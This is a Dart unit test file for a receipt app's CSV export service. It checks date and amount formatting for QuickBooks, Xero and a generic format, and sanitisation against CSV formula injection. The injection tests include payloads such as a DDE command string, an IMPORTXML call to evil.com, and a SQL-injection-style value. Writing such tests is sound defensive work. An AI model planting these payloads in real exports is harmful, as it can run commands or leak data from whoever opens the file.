import 'package:flutter_test/flutter_test.dart';
import 'package:receipt_organizer/domain/services/csv_export_service.dart';
import 'package:receipt_organizer/data/models/receipt.dart';
import 'package:receipt_organizer/data/models/receipt_status.dart';

void main() {
  group('CSVExportService', () {
    late CSVExportService service;

    setUp(() {
      service = CSVExportService();
    });

    Receipt createTestReceipt({
      String? id,
      String? merchantName,
      String? receiptDate,
      double? totalAmount,
      double? taxAmount,
      String? notes,
      double? overallConfidence,
    }) {
      return Receipt(
        id: id ?? '12345678-1234-1234-1234-123456789012',
        merchantName: merchantName,
        receiptDate: receiptDate,
        totalAmount: totalAmount,
        taxAmount: taxAmount,
        notes: notes,
        capturedAt: DateTime(2024, 12, 31, 14, 30),
        status: ReceiptStatus.extracted,
        hasOCRResults: true,
        overallConfidence: overallConfidence ?? 85.5,
      );
    }

    group('CSV Injection Prevention (SEC-001)', () {
      test('should sanitize merchant names starting with equals sign', () {
        // Given - Malicious merchant name
        final receipt = createTestReceipt(
          merchantName: "=cmd|'/c calc'!A1",
          receiptDate: '12/31/2024',
          totalAmount: 100.0,
        );

        // When
        final csv = service.generateCSVContent([receipt], ExportFormat.generic);

        // Then
        expect(csv, contains("'=cmd|'/c calc'!A1"));
        expect(csv, isNot(contains("=cmd|'/c calc'!A1,")));
      });

      test('should sanitize merchant names starting with plus sign', () {
        // Given
        final receipt = createTestReceipt(
          merchantName: '+44 7700 900000',
          receiptDate: '12/31/2024',
          totalAmount: 50.0,
        );

        // When
        final csv = service.generateCSVContent([receipt], ExportFormat.generic);

        // Then
        expect(csv, contains("'+44 7700 900000"));
      });

      test('should sanitize merchant names starting with minus sign', () {
        // Given
        final receipt = createTestReceipt(
          merchantName: '-1 OR 1=1',
          receiptDate: '12/31/2024',
          totalAmount: 75.0,
        );

        // When
        final csv = service.generateCSVContent([receipt], ExportFormat.generic);

        // Then
        expect(csv, contains("'-1 OR 1=1"));
      });

      test('should sanitize merchant names starting with at symbol', () {
        // Given
        final receipt = createTestReceipt(
          merchantName: '@SUM(A1:A10)',
          receiptDate: '12/31/2024',
          totalAmount: 200.0,
        );

        // When
        final csv = service.generateCSVContent([receipt], ExportFormat.generic);

        // Then
        expect(csv, contains("'@SUM(A1:A10)"));
      });

      test('should replace tabs, CR, and LF in merchant names', () {
        // Given
        final receipt = createTestReceipt(
          merchantName: "ABC\tCorp\r\nLLC",
          receiptDate: '12/31/2024',
          totalAmount: 150.0,
        );

        // When
        final csv = service.generateCSVContent([receipt], ExportFormat.generic);

        // Then
        expect(csv, contains('ABC Corp LLC'));
        expect(csv, isNot(contains('\t')));
        expect(csv, isNot(contains('\r')));
        expect(csv, isNot(contains('\n')));
      });

      test('should sanitize notes field', () {
        // Given
        final receipt = createTestReceipt(
          merchantName: 'Safe Merchant',
          notes: "=IMPORTXML('http://evil.com', '//data')",
          receiptDate: '12/31/2024',
          totalAmount: 100.0,
        );

        // When
        final csv = service.generateCSVContent([receipt], ExportFormat.generic);

        // Then
        expect(csv, contains("'=IMPORTXML"));
      });

      test('should handle safe merchant names without modification', () {
        // Given
        final receipt = createTestReceipt(
          merchantName: 'ABC Corporation & Co., Ltd.',
          receiptDate: '12/31/2024',
          totalAmount: 100.0,
        );

        // When
        final csv = service.generateCSVContent([receipt], ExportFormat.generic);

        // Then
        expect(csv, contains('ABC Corporation & Co., Ltd.'));
        expect(csv, isNot(contains("'ABC")));
      });
    });

    group('QuickBooks Format Compliance', () {
      test('should format date as MM/dd/yyyy for QuickBooks', () {
        // Given
        final receipt = createTestReceipt(
          merchantName: 'Test Merchant',
          receiptDate: '2024-12-31',
          totalAmount: 123.45,
          taxAmount: 10.50,
        );

        // When
        final csv = service.generateCSVContent([receipt], ExportFormat.quickbooks);

        // Then
        expect(csv, contains('12/31/2024'));
        expect(csv, contains('123.45'));
        expect(csv, contains('10.50'));
      });

      test('should include required QuickBooks fields in header', () {
        // When
        final csv = service.generateCSVContent([], ExportFormat.quickbooks);

        // Then
        expect(csv, contains('Date,Amount,Payee,Category,Memo,Tax,Notes'));
      });

      test('should include default category for QuickBooks', () {
        // Given
        final receipt = createTestReceipt(
          merchantName: 'Test Merchant',
          receiptDate: '12/31/2024',
          totalAmount: 100.0,
        );

        // When
        final csv = service.generateCSVContent([receipt], ExportFormat.quickbooks);

        // Then
        expect(csv, contains('Business Expenses'));
      });

      test('should handle QuickBooks date formats correctly', () {
        // Given
        final receipts = [
          createTestReceipt(receiptDate: '01/01/2024', totalAmount: 100.0),
          createTestReceipt(receiptDate: '12-31-2024', totalAmount: 200.0),
          createTestReceipt(receiptDate: '2024/06/15', totalAmount: 300.0),
        ];

        // When
        final csv = service.generateCSVContent(receipts, ExportFormat.quickbooks);

        // Then
        expect(csv, contains('01/01/2024'));
        expect(csv, contains('12/31/2024'));
        expect(csv, contains('06/15/2024'));
      });
    });

    group('Xero Format Compliance', () {
      test('should format date as dd/MM/yyyy for Xero', () {
        // Given
        final receipt = createTestReceipt(
          merchantName: 'Test Merchant',
          receiptDate: '2024-12-31',
          totalAmount: 123.45,
          taxAmount: 10.50,
        );

        // When
        final csv = service.generateCSVContent([receipt], ExportFormat.xero);

        // Then
        expect(csv, contains('31/12/2024'));
      });

      test('should include required Xero fields in header', () {
        // When
        final csv = service.generateCSVContent([], ExportFormat.xero);

        // Then
        expect(csv, contains('Date,Amount,Payee,Description,Account Code,Tax Amount,Notes'));
      });

      test('should include default account code for Xero', () {
        // Given
        final receipt = createTestReceipt(
          merchantName: 'Test Merchant',
          receiptDate: '12/31/2024',
          totalAmount: 100.0,
        );

        // When
        final csv = service.generateCSVContent([receipt], ExportFormat.xero);

        // Then
        expect(csv, contains('400')); // Default expense account code
      });

      test('should handle leap year dates correctly for Xero', () {
        // Given
        final receipt = createTestReceipt(
          receiptDate: '2024-02-29', // Leap year
          totalAmount: 100.0,
        );

        // When
        final csv = service.generateCSVContent([receipt], ExportFormat.xero);

        // Then
        expect(csv, contains('29/02/2024'));
      });
    });

    group('Generic Format', () {
      test('should include all available fields in generic format', () {
        // When
        final csv = service.generateCSVContent([], ExportFormat.generic);

        // Then
        final header = csv.split('\n').first;
        expect(header, contains('Receipt ID'));
        expect(header, contains('Date'));
        expect(header, contains('Merchant'));
        expect(header, contains('Total Amount'));
        expect(header, contains('Tax Amount'));
        expect(header, contains('Captured Date'));
        expect(header, contains('Batch ID'));
        expect(header, contains('OCR Confidence'));
        expect(header, contains('Status'));
        expect(header, contains('Notes'));
      });

      test('should format confidence with one decimal place', () {
        // Given
        final receipt = createTestReceipt(
          overallConfidence: 85.567,
          totalAmount: 100.0,
        );

        // When
        final csv = service.generateCSVContent([receipt], ExportFormat.generic);

        // Then
        expect(csv, contains('85.6'));
      });
    });

    group('Amount Formatting', () {
      test('should format amounts with exactly 2 decimal places', () {
        // Given
        final receipts = [
          createTestReceipt(totalAmount: 100.0, taxAmount: 10.0),
          createTestReceipt(totalAmount: 123.456, taxAmount: 12.3456),
          createTestReceipt(totalAmount: 0.1, taxAmount: 0.01),
        ];

        // When
        final csv = service.generateCSVContent(receipts, ExportFormat.generic);

        // Then
        expect(csv, contains('100.00'));
        expect(csv, contains('10.00'));
        expect(csv, contains('123.46')); // Rounded
        expect(csv, contains('12.35'));  // Rounded
        expect(csv, contains('0.10'));
        expect(csv, contains('0.01'));
      });

      test('should handle null amounts gracefully', () {
        // Given
        final receipt = createTestReceipt(
          totalAmount: null,
          taxAmount: null,
        );

        // When
        final csv = service.generateCSVContent([receipt], ExportFormat.quickbooks);

        // Then
        expect(csv, contains('0.00,Unknown Merchant,Business Expenses'));
        // Tax should also be 0.00
        final lines = csv.split('\n');
        expect(lines[1], contains(',0.00,')); // Tax amount
      });
    });

    group('Validation', () {
      test('should validate required fields for QuickBooks', () async {
        // Given
        final receipts = [
          createTestReceipt(merchantName: null, totalAmount: 100.0),
          createTestReceipt(receiptDate: null, totalAmount: 200.0),
          createTestReceipt(totalAmount: null),
          createTestReceipt(totalAmount: -50.0), // Invalid negative amount
        ];

        // When
        final result = await service.validateForExport(receipts, ExportFormat.quickbooks);

        // Then
        expect(result.isValid, isFalse);
        expect(result.errors.length, 4);
        expect(result.validCount, 0);
        expect(result.totalCount, 4);
      });

      test('should warn about low confidence scores', () async {
        // Given
        final receipt = createTestReceipt(
          merchantName: 'Test',
          receiptDate: '12/31/2024',
          totalAmount: 100.0,
          overallConfidence: 65.0, // Below 70% threshold
        );

        // When
        final result = await service.validateForExport([receipt], ExportFormat.quickbooks);

        // Then
        expect(result.isValid, isTrue);
        expect(result.warnings.length, 1);
        expect(result.warnings.first, contains('Low OCR confidence'));
      });

      test('should validate Xero amount limits', () async {
        // Given
        final receipt = createTestReceipt(
          totalAmount: 1000000.00, // Exceeds Xero limit
          merchantName: 'Test',
          receiptDate: '12/31/2024',
        );

        // When
        final result = await service.validateForExport([receipt], ExportFormat.xero);

        // Then
        expect(result.isValid, isFalse);
        expect(result.errors.any((e) => e.contains('exceeds Xero limits')), isTrue);
      });
    });

    group('Notes Field Handling', () {
      test('should include notes in all formats', () {
        // Given
        final receipt = createTestReceipt(
          merchantName: 'Test Merchant',
          receiptDate: '12/31/2024',
          totalAmount: 100.0,
          notes: 'Business lunch with client',
        );

        // When
        final quickbooksCSV = service.generateCSVContent([receipt], ExportFormat.quickbooks);
        final xeroCSV = service.generateCSVContent([receipt], ExportFormat.xero);
        final genericCSV = service.generateCSVContent([receipt], ExportFormat.generic);

        // Then
        expect(quickbooksCSV, contains('Business lunch with client'));
        expect(xeroCSV, contains('Business lunch with client'));
        expect(genericCSV, contains('Business lunch with client'));
      });

      test('should handle empty notes gracefully', () {
        // Given
        final receipts = [
          createTestReceipt(notes: null, totalAmount: 100.0),
          createTestReceipt(notes: '', totalAmount: 200.0),
        ];

        // When
        final csv = service.generateCSVContent(receipts, ExportFormat.generic);

        // Then - Should not cause errors, just empty fields
        final lines = csv.split('\n');
        expect(lines.length, greaterThanOrEqualTo(3)); // Header + 2 receipts
      });
    });

    group('Unicode and Special Characters', () {
      test('should handle unicode characters in merchant names', () {
        // Given
        final receipt = createTestReceipt(
          merchantName: 'Café München €',
          receiptDate: '12/31/2024',
          totalAmount: 25.50,
        );

        // When
        final csv = service.generateCSVContent([receipt], ExportFormat.generic);

        // Then
        expect(csv, contains('Café München €'));
      });

      test('should handle special characters safely', () {
        // Given
        final receipt = createTestReceipt(
          merchantName: 'ABC & Co., Ltd. "Premium"',
          receiptDate: '12/31/2024',
          totalAmount: 100.0,
        );

        // When
        final csv = service.generateCSVContent([receipt], ExportFormat.generic);

        // Then
        expect(csv, contains('ABC & Co., Ltd. "Premium"'));
      });
    });
  });
}